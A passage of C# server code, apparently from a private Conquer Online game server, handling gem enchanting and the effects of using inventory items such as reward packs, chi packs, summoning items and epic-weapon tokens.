                byte gemBase = (byte)(EnchantGem.ID % 1000);
                if (Enum.IsDefined(typeof(Game.Enums.Gem), gemBase))
                {
                    byte Enchant = 0;
                    switch (EnchantGem.ID % 10)
                    {
                        case 1:
                            {
                                Enchant = (byte)Kernel.Random.Next(1, 59);
                                break;
                            }
                        case 2:
                            {
                                if (EnchantGem.ID == 700012)
                                    Enchant = (byte)Kernel.Random.Next(100, 159);
                                else if (EnchantGem.ID == 700002 || EnchantGem.ID == 700052 || EnchantGem.ID == 700062)
                                    Enchant = (byte)Kernel.Random.Next(60, 109);
                                else if (EnchantGem.ID == 700032)
                                    Enchant = (byte)Kernel.Random.Next(80, 129);
                                else
                                    Enchant = (byte)Kernel.Random.Next(40, 89);
                                break;
                            }
                        default:
                            {
                                if (EnchantGem.ID == 700013)
                                    Enchant = (byte)Kernel.Random.Next(200, 255);
                                else if (EnchantGem.ID == 700003 || EnchantGem.ID == 700073 || EnchantGem.ID == 700033)
                                    Enchant = (byte)Kernel.Random.Next(170, 229);
                                else if (EnchantGem.ID == 700063 || EnchantGem.ID == 700053)
                                    Enchant = (byte)Kernel.Random.Next(140, 199);
                                else if (EnchantGem.ID == 700023)
                                    Enchant = (byte)Kernel.Random.Next(90, 149);
                                else
                                    Enchant = (byte)Kernel.Random.Next(70, 119);
                                break;
                            }
                    }
                    client.Send(Constants.Enchant(Item.Enchant, Enchant));
                    if (Enchant > Item.Enchant)
                    {
                        Item.Enchant = Enchant;
                        Item.Mode = MTA.Game.Enums.ItemMode.Update;
                        Item.Send(client);
                        Database.ConquerItemTable.UpdateEnchant(Item);
                        client.Inventory.Remove(EnchantGem, MTA.Game.Enums.ItemUse.Remove);
                    }
                    else
                    {
                        client.Inventory.Remove(EnchantGem, MTA.Game.Enums.ItemUse.Remove);
                    }
                }
            }
        }

        static void UseItem(ConquerItem item, Client.GameState client)
        {
            Database.ConquerItemInformation infos = new Database.ConquerItemInformation(item.ID, 0);
            if (client.Booth != null)
                return;
            #region guildCondutors
            if (item.ID >= 720021 && item.ID <= 720024)
            {
                GamePackets.NpcRequest npc = new GamePackets.NpcRequest(5);
                {
                    switch (item.ID)
                    {
                        case 720021:
                            {

                                var getnpc = Database.GuildCondutors.GuildConductors[9994];
                                client.Entity.OnMoveNpc = getnpc.npc.UID;
                                npc.Mesh = getnpc.npc.Mesh;
                                break;
                            }
                        case 720022:
                            {
                                var getnpc = Database.GuildCondutors.GuildConductors[9995];
                                client.Entity.OnMoveNpc = getnpc.npc.UID;
                                npc.Mesh = getnpc.npc.Mesh;
                                break;
                            }
                        case 720023:
                            {
                                var getnpc = Database.GuildCondutors.GuildConductors[9996];
                                client.Entity.OnMoveNpc = getnpc.npc.UID;
                                npc.Mesh = getnpc.npc.Mesh;
                                break;
                            }
                        case 720024:
                            {
                                var getnpc = Database.GuildCondutors.GuildConductors[9997];
                                client.Entity.OnMoveNpc = getnpc.npc.UID;
                                npc.Mesh = getnpc.npc.Mesh;
                                break;
                            }

                    }
                    client.spwansitem = item;
                    npc.NpcID = client.Entity.OnMoveNpc;
                    //   npc.NpcTyp = (Enums.NpcType)2;
                    client.Send(npc.ToArray());
                }
            }
            #endregion

            switch (item.ID)
            {
                #region House Mobs
                case 3004259:
                case 720842://swordsoul
                    {
                        uint monsterID = 0;
                        if (item.ID == 3004259)
                            monsterID = 41710;
                        if (item.ID == 720842)
                            monsterID = 4170;
                        DateTime itemtime = client[item.ID.ToString()];
                        if (DateTime.Now >= itemtime.AddHours(3.0))
                        {
                            if (MaTrix.House.Houses.ContainsKey(client.Entity.UID))
                            {
                                var myhouse = MaTrix.House.Houses[(client.Entity.UID)];
                                if (client.Entity.MapID == myhouse.ID)
                                {
                                    #region Summoning
                                    if (Database.MonsterInformation.MonsterInformations.ContainsKey(monsterID))
                                    {
                                        Database.MonsterInformation mt = Database.MonsterInformation.MonsterInformations[monsterID];
                                        mt.BoundX = client.Entity.X;
                                        mt.BoundY = client.Entity.Y;
                                        mt.RespawnTime = 36000;
                                        Entity entity = new Entity(EntityFlag.Monster, false);
                                        entity.MapObjType = MapObjectType.Monster;
                                        entity.MonsterInfo = mt.Copy();
                                        entity.MonsterInfo.Owner = entity;
                                        entity.Name = mt.Name;
                                        entity.MinAttack = mt.MinAttack;
                                        entity.MaxAttack = entity.MagicAttack = mt.MaxAttack;
                                        entity.Hitpoints = entity.MaxHitpoints = mt.Hitpoints;
                                        entity.Defence = mt.Defence;
                                        entity.Body = mt.Mesh;
                                        entity.Level = mt.Level;
                                        entity.UID = client.Map.EntityUIDCounter.Next;
                                        entity.MapID = client.Entity.MapID;
                                        entity.SendUpdates = true;
                                        entity.X = client.Entity.X;
                                        entity.Y = client.Entity.Y;
                                        client.Map.AddEntity(entity);
                                        client.SendScreenSpawn(entity, true);
                                        if (entity.MaxHitpoints > 65535)
                                        {
                                            Update upd = new Update(true) { UID = entity.UID };
                                            upd.Append(Update.Hitpoints, entity.Hitpoints);
                                            client.SendScreen(upd, true);
                                        }
                                        client[item.ID.ToString()] = DateTime.Now;//record time
                                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);// remove item
                                        //client.Entity.ConquerPoints -= 500000;
                                    }
                                    #endregion
                                }
                                else
                                    client.MessageBox("only in your house.");
                            }
                            else
                                client.MessageBox("only in house.");
                        }
                        else
                        {
                            TimeSpan Remain = itemtime.AddHours(3.0) - DateTime.Now;
                            string message = "Time Till Next Usage :";
                            message += string.Format("{1} Minutes : {2} Seconds", Remain.Hours, Remain.Minutes, Remain.Seconds);
                            client.MessageBox(message, null, null);
                            break;
                        }
                        break;
                    }
                #endregion
                default:
                    {
                        if (Database.Furniture.FurnituresItems.ContainsKey(item.ID))
                        {
                            if (client.Entity.MapID != (ushort)client.Entity.UID)
                                return;
                            client.spwansitem = item;
                            NpcRequest req = new NpcRequest(5);
                            req.Mesh = Database.Furniture.FurnituresItems[item.ID];
                            if (req.Mesh == 8200)
                                req.NpcTyp = (Enums.NpcType)2;
                            else
                                req.NpcTyp = (Enums.NpcType)26;
                            client.Send(req);
                        }
                        break;
                    }
                case 3002687: // vip 6
                    {
                        client.Entity.VIPLevel = 7;
                        client.MessageBox("congratulations You get vip 7");
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 720793:
                    {
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 720981:
                    {
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 3000776:
                    {
                        int cps = Kernel.Random.Next(10, 50);
                        client.Entity.ConquerPoints += (uint)cps;
                        client.Send(new Message("Congratulations you got Conquer Point Points keep going", System.Drawing.Color.Red, Message.Whisper));
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 3001607://الطاقة
                    {
                        if (client.ChiPowers.Count > 0)
                        {
                            for (int i = 0; i < client.ChiPowers.Count; i++)
                            {
                                var Mode = i + 1;
                                for (int ii = 0; ii < 4; ii++)
                                {
                                    var pos = ii;
                                    var powers = client.ChiPowers[Mode - 1];
                                    var attributes = powers.Attributes;
                                    attributes[pos].Value = (ushort)Game.Enums.ChiMaxValues(attributes[pos].Type);
                                    powers.CalculatePoints();
                                    Database.ChiTable.Sort((Enums.ChiPowerType)Mode);
                                    powers.Power = (Enums.ChiPowerType)Mode;
                                    client.Send(new ChiPowers(true).Query(client));
                                    #region update ranking
                                    Database.ChiTable.ChiData[] array = null;
                                    switch ((Enums.ChiPowerType)Mode)
                                    {
                                        case Game.Enums.ChiPowerType.Dragon:
                                            array = Database.ChiTable.Dragon;
                                            break;

                                        case Game.Enums.ChiPowerType.Phoenix:
                                            array = Database.ChiTable.Phoenix;
                                            break;

                                        case Game.Enums.ChiPowerType.Tiger:
                                            array = Database.ChiTable.Tiger;
                                            break;

                                        case Game.Enums.ChiPowerType.Turtle:
                                            array = Database.ChiTable.Turtle;
                                            break;
                                    }
                                    foreach (var chiData in array)
                                    {
                                        if (Kernel.GamePool.ContainsKey(chiData.UID))
                                        {
                                            var pClient = Kernel.GamePool[chiData.UID];
                                            if (pClient == null) continue;
                                            if (pClient.ChiData == null) continue;
                                            SendRankingQuery(new GenericRanking(true) { Mode = GenericRanking.QueryCount }, pClient, GenericRanking.Chi + (uint)Mode, pClient.ChiData.SelectRank((Enums.ChiPowerType)Mode), pClient.ChiData.SelectPoints((Enums.ChiPowerType)Mode));
                                            if (pClient.Entity.UID == client.Entity.UID || pClient.ChiData.SelectRank((Enums.ChiPowerType)Mode) < 50)
                                                pClient.LoadItemStats();
                                        }
                                    }
                                    #endregion
                                    Database.ChiTable.Save(client);
                                }
                            }
                        }
                        else
                        {
                            client.MessageBox("You Don't Open chi yet");
                            return;
                        }
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        break;
                    }
                #region Way2Heroes

                case 3005117: //Class1FortunePack 
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        client.Entity.ConquerPoints += 10;
                        client.Send(new Message("Congratulations you got 10 Cps keep going", System.Drawing.Color.Red, Message.TopLeft));
                        break;
                    }


                case 3005118: //Class2FortunePack 
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        client.Entity.ConquerPoints += 20;
                        client.Send(new Message("Congratulations you got 20 Cps keep going", System.Drawing.Color.Red, Message.TopLeft));
                        break;
                    }


                case 3005119: //Class3FortunePack 
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        client.Entity.ConquerPoints += 30;
                        client.Send(new Message("Congratulations you got 30 Cps keep going", System.Drawing.Color.Red, Message.TopLeft));
                        break;
                    }

                case 3005120: //Class4FortunePack 
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        client.Entity.ConquerPoints += 40;
                        client.Send(new Message("Congratulations you got 40 Cps keep going", System.Drawing.Color.Red, Message.TopLeft));
                        break;
                    }

                case 3005121: //Class5FortunePack 
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        client.Entity.ConquerPoints += 50;
                        client.Send(new Message("Congratulations you got 50 Cps keep going", System.Drawing.Color.Red, Message.TopLeft));
                        break;
                    }

                case 3005122: //Class6FortunePack 
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        client.Entity.ConquerPoints += 60;
                        client.Entity.SubClasses.StudyPoints += 40;
                        client.Send(new Message("Congratulations you got 60 Cps And 40 study Points keep going", System.Drawing.Color.Red, Message.TopLeft));
                        break;
                    }

                case 3005126: //NormalChiPack 
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        client.ChiPoints += 500;
                        client.Send(new Message("Congratultions you have got 500 Chi points.", System.Drawing.Color.Red, Message.TopLeft));
                        break;
                    }


                case 3005127: //MediumChiPack 
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        client.ChiPoints += 1000;
                        client.Send(new Message("Congratultions you have got 1000 Chi points.", System.Drawing.Color.Red, Message.TopLeft));
                        break;
                    }


                case 3005128: //SeniorChiPack 
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        client.ChiPoints += 2000;
                        client.Send(new Message("Congratultions you have got 2000 Chi points.", System.Drawing.Color.Red, Message.TopLeft));
                        break;
                    }

                case 3005129: // ExtremeChiPack 
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        client.ChiPoints += 3000;
                        client.Send(new Message("Congratultions you have got 3000 Chi points.", System.Drawing.Color.Red, Message.TopLeft));
                        break;
                    }


                case 3005130: //RefinedhGem(B)Pack 
                    {
                        if (client.Inventory.Count <= 38)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                            Random R = new Random();
                            int Nr = R.Next(1, 10);
                            if (Nr == 1) client.Inventory.Add(700002, 0, 1);
                            if (Nr == 2) client.Inventory.Add(700013, 0, 1);
                            if (Nr == 3) client.Inventory.Add(700022, 0, 1);
                            if (Nr == 4) client.Inventory.Add(700032, 0, 1);
                            if (Nr == 5) client.Inventory.Add(700042, 0, 1);
                            if (Nr == 6) client.Inventory.Add(700052, 0, 1);
                            if (Nr == 7) client.Inventory.Add(700062, 0, 1);
                            if (Nr == 8) client.Inventory.Add(700072, 0, 1);
                            if (Nr == 9) client.Inventory.Add(700102, 0, 1);
                            if (Nr == 10) client.Inventory.Add(700122, 0, 1);
                        }
                        client.Send(new Message("Congratultions you have got RefinedGeM.", System.Drawing.Color.Red, Message.TopLeft));
                        break;
                    }

                case 3005132: //SuperGem(B)Pack 
                    {
                        if (client.Inventory.Count <= 38)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                            Random R = new Random();
                            int Nr = R.Next(1, 10);
                            if (Nr == 1) client.Inventory.Add(700003, 0, 1);
                            if (Nr == 2) client.Inventory.Add(700014, 0, 1);
                            if (Nr == 3) client.Inventory.Add(700023, 0, 1);
                            if (Nr == 4) client.Inventory.Add(700033, 0, 1);
                            if (Nr == 5) client.Inventory.Add(700043, 0, 1);
                            if (Nr == 6) client.Inventory.Add(700053, 0, 1);
                            if (Nr == 7) client.Inventory.Add(700063, 0, 1);
                            if (Nr == 8) client.Inventory.Add(700073, 0, 1);
                            if (Nr == 9) client.Inventory.Add(700103, 0, 1);
                            if (Nr == 10) client.Inventory.Add(700123, 0, 1);
                        }
                        client.Send(new Message("Congratultions you have got SuperGem.", System.Drawing.Color.Red, Message.TopLeft));
                        break;
                    }


                case 3005133: //P4DragonSoulBag 
                    {
                        if (client.Inventory.Count <= 38)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                            Random R = new Random();
                            int Nr = R.Next(1, 10);
                            if (Nr == 1) client.Inventory.Add(800803, 0, 1);
                            if (Nr == 2) client.Inventory.Add(800808, 0, 1);
                            if (Nr == 3) client.Inventory.Add(823052, 0, 1);
                            if (Nr == 4) client.Inventory.Add(823053, 0, 1);
                            if (Nr == 5) client.Inventory.Add(823054, 0, 1);
                            if (Nr == 6) client.Inventory.Add(800720, 0, 1);
                            if (Nr == 7) client.Inventory.Add(800253, 0, 1);

                        }
                        client.Send(new Message("Congratultions you have got P4DragonSoul.", System.Drawing.Color.Red, Message.TopLeft));
                        break;
                    }
                case 3005300: //TurkeyRunPack 
                    {
                        if (client.Inventory.Count <= 38)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                            client.Inventory.Add(200490, 0, 1);

                        }
                        else
                            client.Send(Constants.FullInventory);
                        break;
                    }
                case 3005301:   //FancyAlpacaPack 
                    {
                        if (client.Inventory.Count <= 38)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                            client.Inventory.Add(200499, 0, 1);

                        }
                        else
                            client.Send(Constants.FullInventory);
                        break;
                    }
                case 3005134: //SweetLovePack 
                    {
                        if (client.Inventory.Count <= 38)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                            client.Inventory.Add(422020, 0, 1);
                            client.Inventory.Add(755099, 0, 1);
                        }
                        else
                            client.Send(Constants.FullInventory);
                        break;
                    }
                case 3005309: // 100PointsChiPack 
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        client.ChiPoints += 100;
                        client.Send(new Message("Congratultions you have got 100 Chi points.", System.Drawing.Color.Red, Message.TopLeft));
                        break;
                    }


                case 3005310: //120PointsChiPack 
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        client.ChiPoints += 120;
                        client.Send(new Message("Congratultions you have got 120 Chi points.", System.Drawing.Color.Red, Message.TopLeft));
                        break;
                    }


                case 3005311: //160PointsChiPack 
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        client.ChiPoints += 160;
                        client.Send(new Message("Congratultions you have got 160 Chi points.", System.Drawing.Color.Red, Message.TopLeft));
                        break;
                    }


                case 3005312: //300PointsChiPack 
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        client.ChiPoints += 300;
                        client.Send(new Message("Congratultions you have got 300 Chi points.", System.Drawing.Color.Red, Message.TopLeft));
                        break;
                    }

                case 3005313: //800PointsChiPack 
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        client.ChiPoints += 800;
                        client.Send(new Message("Congratultions you have got 800 Chi points.", System.Drawing.Color.Red, Message.TopLeft));
                        break;
                    }
                case 3005314: //1000PointsChiPack 
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        client.ChiPoints += 1000;
                        client.Send(new Message("Congratultions you have got 1000 Chi points.", System.Drawing.Color.Red, Message.TopLeft));
                        break;
                    }
                case 3005331: //P7WeaponSoulPack 
                    {
                        if (client.Inventory.Count <= 38)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                            Random R = new Random();
                            int Nr = R.Next(1, 10);
                            if (Nr == 1) client.Inventory.Add(800111, 0, 1);
                            if (Nr == 2) client.Inventory.Add(800142, 0, 1);
                            if (Nr == 3) client.Inventory.Add(800522, 0, 1);
                            if (Nr == 4) client.Inventory.Add(800618, 0, 1);
                            if (Nr == 5) client.Inventory.Add(800422, 0, 1);
                            if (Nr == 6) client.Inventory.Add(800725, 0, 1);
                            if (Nr == 7) client.Inventory.Add(800810, 0, 1);
                            if (Nr == 8) client.Inventory.Add(800811, 0, 1);
                            //   if (Nr == 9) client.Inventory.Add(800811, 0, 1); 
                            // if (Nr == 10) client.Inventory.Add(700123, 0, 1); 
                        }
                        client.Send(new Message("Congratultions you have got P7WeaponSoul.", System.Drawing.Color.Red, Message.TopLeft));
                        break;
                    }
                case 3005135: //P6DragonSoulBag 
                    {
                        if (client.Inventory.Count <= 38)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                            Random R = new Random();
                            int Nr = R.Next(1, 10);
                            if (Nr == 1) client.Inventory.Add(800000, 0, 1);
                            if (Nr == 2) client.Inventory.Add(800017, 0, 1);
                            if (Nr == 3) client.Inventory.Add(801003, 0, 1);
                            if (Nr == 4) client.Inventory.Add(800809, 0, 1);
                            if (Nr == 5) client.Inventory.Add(800722, 0, 1);
                            if (Nr == 6) client.Inventory.Add(821032, 0, 1);
                            if (Nr == 7) client.Inventory.Add(821031, 0, 1);
                            //     if (Nr == 8) client.Inventory.Add(800838, 0, 1); 
                            //   if (Nr == 9) client.Inventory.Add(700103, 0, 1); 
                            // if (Nr == 10) client.Inventory.Add(700123, 0, 1); 
                        }
                        client.Send(new Message("Congratultions you have got P6DragonSoul.", System.Drawing.Color.Red, Message.TopLeft));
                        break;
                    }
                #endregion Way2Heroes  
                #region NinjaScroll
                case 3004458:
                    {
                        Npcs dialog = new Npcs(client);
                        dialog.Text("Welcome Ninja , The ninja EpicWeapon (Nabuganas Claws ) Was Forged Carfully by the Ancient FrankoNinja . Which mastered the NinjaClass and the Franko . Only the True ninjas who have Mastered Those Ancient Skills . are qualified to get that Legendary EpicWeapon . He/She will be Qualified to Take on the Extraordinary EpicQuest . To Take on the quest talk to DivineFranko in the Middle of Twincity's Square . GoodLuck Ninja .");
                        dialog.Option("Iam on it!", 255);
                        dialog.Send();
                        break;
                    }
                #endregion
                #region TrojanScroll
                case 3003341:
                    {
                        Npcs dialog = new Npcs(client);
                        dialog.Text("Welcome Trojan . The TrojanEpicWeapon was Forged with the power of Light . Was Forged Carfully and Professionally by the Most Spectacular Trojans of the Ancient Times . the Weapon Was Stolen and Lost by the FlameDevastators Army . The EpicWeapon is a Saber . Which have an amazing Attack and Agillity . It's the Weapon which all the professional Trojan will be dreaming with RightNow ! . Only the Profesional Trojans Can Be Qualified to Take on this Legendary Hard Quest . Talk to TrojanEpicQuest NPC At Twincity Square for all the information . GoodLuck Trojan");
                        dialog.Option("Iam on it!", 255);
                        dialog.Send();
                        break;
                    }
                #endregion
                #region Franko SmallCPBox Cps
                case 720996:
                    {
                        if (client.Inventory.Count <= 38)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                            Random R = new Random();
                            int Nr = R.Next(1, 10);
                            if (Nr == 1) client.Entity.Money += 100000000;
                            if (Nr == 2) client.Entity.ConquerPoints += 5000000;
                            if (Nr == 4) client.Entity.SubClasses.StudyPoints += 20000;
                            if (Nr == 5) client.Entity.BoundCps += 5000000;
                        }
                        Npcs dialog = new Npcs(client);
                        dialog.Text("Hello. " + client.Entity.Name + " You Can Open [ SmallCPBox ] [ Maded By Franko ] Get Prize >>> 500.000.000 Silvers - OR - 5.000.000 CPs - OR - 20.000 Study Points - OR - 5.000.000 CPSBound <<< Good Luck Good.");
                        dialog.Option("Thansk you:*.", 255);
                        dialog.Send();
                        client.ActiveNpc = item.ID;
                        break;
                    }
                #endregion
                #region P7WeaponSoulPackScrap
                case 3004243:
                    {
                        if (item.StackSize >= 15)
                        {
                            client.Inventory.Add(3004247, 0, 1);
                            item.StackSize -= 15;
                            client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        }
                        else
                        {
                            client.Send("You need 15 Scraps to Continue ");
                        }
                        break;
                    }
                #endregion
                #region P7EquipmentSoulScrap
                case 3004244:
                    {
                        if (item.StackSize >= 15)
                        {
                            client.Inventory.Add(3004248, 0, 1);
                            item.StackSize -= 15;
                            client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        }
                        else
                        {
                            client.Send("You need 15 Scraps to Continue ");
                        }
                        break;
                    }
                #endregion
                #region SacredRefineryScrap
                case 3004245:
                    {
                        if (item.StackSize >= 15)
                        {
                            client.Inventory.Add(3004249, 0, 1);
                            item.StackSize -= 15;
                            client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        }
                        else
                        {
                            client.Send("You need 15 Scraps to Continue ");
                        }
                        break;
                    }
                #endregion
                #region AncientStone
                case 3004246:
                    {
                        if (item.StackSize >= 200)
                        {
                            client.Inventory.Add(3004247, 0, 1);
                            client.Inventory.Add(3004248, 0, 1);
                            client.Inventory.Add(3004249, 0, 1);
                            item.StackSize -= 200;
                            client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        }
                        else
                        {
                            client.Send("You need 200 AncientStone to Continue ");
                        }
                        break;
                    }
                #endregion
                #region SoulScrolls
                case 3004260:
                    {
                        if (item.StackSize >= 7)
                        {
                            client.Inventory.Add(3004248, 0, 1);
                            item.StackSize -= 7;
                            client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        }
                        else
                        {
                            client.Send("You need 7 SoulScrolls to Continue ");
                        }
                        break;
                    }
                #endregion
                #region Life`sEye
                case 3004464:
                    {
                        PacketHandler.CheckCommand2("@tegotegatege Nobunaga`sTwistedClaw Super 6 3 245 13 13", client);
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        Kernel.SendWorldMessage(new Message(" " + client.Entity.Name + " Got the life'sEye . and Obtained a Super +6 -3 . Nobunaga's Claws ( NinjaEpicWeapon )", System.Drawing.Color.Cyan, Message.Center), Program.Values);
                        break;
                    }
                #endregion
                #region Trjan Epic
                case 3003340:
                    {
                        PacketHandler.CheckCommand2("@tegotegatege FrankoCrossSaber Super 6 3 245 13 13", client);
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        Kernel.SendWorldMessage(new Message(" " + client.Entity.Name + " Got the SolarBlade . and Obtained a Super +6 -3 . FrankoCrossSaber ( TrojanEpicWeapon )", System.Drawing.Color.Cyan, Message.Center), Program.Values);
                        break;
                    }
                #endregion
                #region DivinePanacea
                case 3006016://3006226
                    {
                        PacketHandler.CheckCommand2("@tegotegatege DivineBacksword Super 6 3 245 3 3", client);
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        Kernel.SendWorldMessage(new Message(" " + client.Entity.Name + " Got the DivinePanacea . and Obtained a Super +6 -3 . ImperialBacksword ( TaoistEpicWeapon )", System.Drawing.Color.Cyan, Message.Center), Program.Values);
                        break;
                    }
                #endregion
                #region EpicWeaponToken
                case 3006226://
                    {
                        PacketHandler.CheckCommand2("@tegotegatege DesireHossu Super 6 3 245 3 3", client);
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        Kernel.SendWorldMessage(new Message(" " + client.Entity.Name + " Got the EpicWeaponToken . and Obtained a Super +6 -3 . UniverseHossu ( TaoistEpicWeapon )", System.Drawing.Color.Cyan, Message.Center), Program.Values);
                        break;
                    }
                #endregion

                #region P4DragonSoulPack
                case 3005891:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        Random R = new Random();
                        int Nr = R.Next(1, 16);
                        if (Nr == 1)
                        {
                            client.Inventory.Add(800014, 0, 1);
                        }
                        if (Nr == 2)
                        {
                            client.Inventory.Add(800015, 0, 1);

                        }
                        if (Nr == 3)
                        {
                            client.Inventory.Add(800016, 0, 1);

                        }
                        if (Nr == 4)
                        {
                            client.Inventory.Add(800214, 0, 1);

                        }
                        if (Nr == 5)
                        {
                            client.Inventory.Add(800253, 0, 1);

                        }
                        if (Nr == 6)
                        {
                            client.Inventory.Add(800512, 0, 1);

                        }
                        if (Nr == 7)
                        {
                            client.Inventory.Add(800613, 0, 1);

                        }
                        if (Nr == 8)
                        {
                            client.Inventory.Add(800720, 0, 1);

                        }
                        if (Nr == 9)
                        {
                            client.Inventory.Add(800803, 0, 1);

                        }
                        if (Nr == 10)
                        {
                            client.Inventory.Add(800808, 0, 1);
                        }
                        if (Nr == 11)
                        {
                            client.Inventory.Add(800913, 0, 1);
                        }
                        if (Nr == 12)
                        {
                            client.Inventory.Add(823052, 0, 1);

                        }
                        if (Nr == 13)
                        {
                            client.Inventory.Add(823053, 0, 1);

                        }
                        if (Nr == 14)
                        {
                            client.Inventory.Add(823054, 0, 1);

                        }
                        if (Nr == 15)
                        {
                            client.Inventory.Add(801002, 0, 1);

                        }
                        if (Nr == 16)
                        {
                            client.Inventory.Add(801102, 0, 1);

                        }
                        break;
                    }
                #endregion
                #region P5DragonSoulPack
                case 3005892:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        Random R = new Random();
                        int Nr = R.Next(1, 5);
                        if (Nr == 1)
                        {
                            client.Inventory.Add(800415, 0, 1);
                        }
                        if (Nr == 2)
                        {
                            client.Inventory.Add(820056, 0, 1);

                        }
                        if (Nr == 3)
                        {
                            client.Inventory.Add(820057, 0, 1);

                        }
                        if (Nr == 4)
                        {
                            client.Inventory.Add(821028, 0, 1);

                        }
                        if (Nr == 5)
                        {
                            client.Inventory.Add(821030, 0, 1);

                        }
                        break;
                    }
                #endregion
                #region P7EquipmentSoulPack
                case 3004248:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        Random R = new Random();
                        int Nr = R.Next(1, 16);
                        if (Nr == 1)
                        {
                            client.Inventory.Add(820073, 0, 1);
                        }
                        if (Nr == 2)
                        {
                            client.Inventory.Add(820074, 0, 1);

                        }
                        if (Nr == 3)
                        {
                            client.Inventory.Add(820075, 0, 1);

                        }
                        if (Nr == 4)
                        {
                            client.Inventory.Add(820076, 0, 1);

                        }
                        if (Nr == 5)
                        {
                            client.Inventory.Add(821033, 0, 1);

                        }
                        if (Nr == 6)
                        {
                            client.Inventory.Add(821034, 0, 1);

                        }
                        if (Nr == 7)
                        {
                            client.Inventory.Add(822071, 0, 1);

                        }
                        if (Nr == 8)
                        {
                            client.Inventory.Add(822072, 0, 1);

                        }
                        if (Nr == 9)
                        {
                            client.Inventory.Add(823058, 0, 1);

                        }
                        if (Nr == 10)
                        {
                            client.Inventory.Add(823059, 0, 1);
                        }
                        if (Nr == 11)
                        {
                            client.Inventory.Add(823060, 0, 1);
                        }
                        if (Nr == 12)
                        {
                            client.Inventory.Add(824018, 0, 1);

                        }
                        if (Nr == 13)
                        {
                            client.Inventory.Add(824019, 0, 1);

                        }
                        if (Nr == 14)
                        {
                            client.Inventory.Add(824020, 0, 1);

                        }
                        if (Nr == 15)
                        {
                            client.Inventory.Add(823061, 0, 1);

                        }
                        if (Nr == 16)
                        {
                            client.Inventory.Add(823062, 0, 1);

                        }
                        break;
                    }
                #endregion
                #region SacredRefineryPack
                case 3004249:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        Random R = new Random();
                        int Nr = R.Next(1, 31);
                        if (Nr == 1)
                        {
                            client.Inventory.Add(3004136, 0, 1);
                        }
                        if (Nr == 2)
                        {
                            client.Inventory.Add(3004146, 0, 1);

                        }
                        if (Nr == 3)
                        {
                            client.Inventory.Add(3004155, 0, 1);

                        }
                        if (Nr == 4)
                        {
                            client.Inventory.Add(3004157, 0, 1);

                        }
                        if (Nr == 5)
                        {
                            client.Inventory.Add(3004137, 0, 1);

                        }
                        if (Nr == 6)
                        {
                            client.Inventory.Add(3004156, 0, 1);

                        }
                        if (Nr == 7)
                        {
                            client.Inventory.Add(3004147, 0, 1);

                        }
                        if (Nr == 8)
                        {
                            client.Inventory.Add(3004158, 0, 1);

                        }
                        if (Nr == 9)
                        {
                            client.Inventory.Add(3004138, 0, 1);

                        }
                        if (Nr == 10)
                        {
                            client.Inventory.Add(3004148, 0, 1);
                        }
                        if (Nr == 11)
                        {
                            client.Inventory.Add(3004139, 0, 1);
                        }
                        if (Nr == 12)
                        {
                            client.Inventory.Add(3004149, 0, 1);

                        }
                        if (Nr == 13)
                        {
                            client.Inventory.Add(3004140, 0, 1);

                        }
                        if (Nr == 14)
                        {
                            client.Inventory.Add(3004141, 0, 1);

                        }
                        if (Nr == 15)
                        {
                            client.Inventory.Add(3004150, 0, 1);

                        }
                        if (Nr == 16)
                        {
                            client.Inventory.Add(3004159, 0, 1);

                        }
                        if (Nr == 17)
                        {
                            client.Inventory.Add(3004163, 0, 1);

                        }
                        if (Nr == 18)
                        {
